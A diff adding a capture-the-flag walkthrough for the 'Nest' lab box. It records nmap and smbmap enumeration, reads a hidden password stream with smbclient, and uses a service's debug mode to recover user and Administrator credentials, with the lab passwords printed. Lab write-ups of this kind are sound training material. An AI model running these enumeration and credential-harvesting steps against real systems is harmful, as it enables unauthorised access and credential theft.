@@ -1,0 +1,98 @@
+== Hacking into "Nest" ==
+
+* Running a port scan on the 1000 most popular ports *
+nmap -sC -sV -oA nmap/nest 10.10.10.178
+
+445/tcp which is the port for Samba is found open
+
+
+* Also runing a nmap scan on all the available ports *
+nmap -p- 10.10.10.178
+
+4386/tcp is also found open but it is unknown what it is used for
+
+* Using smbmap we see we have access to some directories and files, we also see some users *
+smbmap -u " " -p " " -d "htb.local" -H 10.10.10.178
+
+      Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        .                                                  
+        dr--r--r--                0 Thu Aug  8 01:53:46 2019    .
+        dr--r--r--                0 Thu Aug  8 01:53:46 2019    ..
+        dr--r--r--                0 Thu Aug  8 01:58:07 2019    IT
+        dr--r--r--                0 Tue Aug  6 00:53:41 2019    Production
+        dr--r--r--                0 Tue Aug  6 00:53:50 2019    Reports
+        dr--r--r--                0 Wed Aug  7 22:07:51 2019    Shared
+        Data                                                    READ ONLY
+        IPC$                                                    NO ACCESS       Remote IPC
+        Secure$                                                 NO ACCESS
+        .                                                  
+        dr--r--r--                0 Sun Jan 26 01:04:21 2020    .
+        dr--r--r--                0 Sun Jan 26 01:04:21 2020    ..
+        dr--r--r--                0 Fri Aug  9 18:08:23 2019    Administrator
+        dr--r--r--                0 Sun Jan 26 09:21:44 2020    C.Smith
+        dr--r--r--                0 Thu Aug  8 20:03:29 2019    L.Frost
+        dr--r--r--                0 Thu Aug  8 20:02:56 2019    R.Thompson
+        dr--r--r--                0 Thu Aug  8 01:56:02 2019    TempUser
+        Users                                                   READ ONLY
+
+
+
+* Doing a bit of searching with smbmap i found a welcome email, that contains creds for TempUser *
+Username: TempUser
+Password: welcome2019
+
+
+* Using TempUser i have access to more data, one thing i noticed was the RU_config.xml 
+which contains creds for another users *
+
+<Username>c.smith</Username>
+<Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
+
+
+* Apperently with a bit of luck when i pasted the encrypted password on Google 
+it delivered a page in which some had decrypted it already, lucky i guess*
+
+password: xRxRxPANCAK3SxRxRx
+
+* The correct way would be to notice in the notepad++ config there were some changes in the dir of 
+IT\Carl. There the file Utils.vb could be found that contained the decryption methods required 
+for the password *
+
+password: xRxRxPANCAK3SxRxRx
+
+
+* Found the 'Debug Mode Password.txt' which appeared empty from linux but using 'smbclient allinfo' on the file
+to reveal hidden attributes and then 'smbclient get "Debug Mode Password.txt":"Password" got me the password *
+password: WBQ201953D8w
+
+
+* Also downloaded a "HqkLdap.exe", which might be what's running on port 4386???, a quick look with string gave me*
+PublicKeyToken=b77a5c561934e089
+
+* Using telnet -4 10.10.10.178 4386 we connect to port 4386 which runs some kind of software, running the help command
+brings some other options *
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+
+* Running the debug command with password: WBQ201953D8w, changes to debug mode, gives extra options *
+SERVICE
+SESSION
+SHOWQUERY <Query_ID>
+
+* Setting the dir to "C:\Program Files\HQK\LDAP" and running SHOWQUERY 2 ruturns the encrypted Administrator password *
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+
+NOTES: It is possible that the same or similar encryption algorithm was used for this password as the first we decrypted!
+
+
+!!! Need to actually do the disasembly on HqkLdap !!!
+
+Administrator password: XtH4nkS4Pl4y1nGX
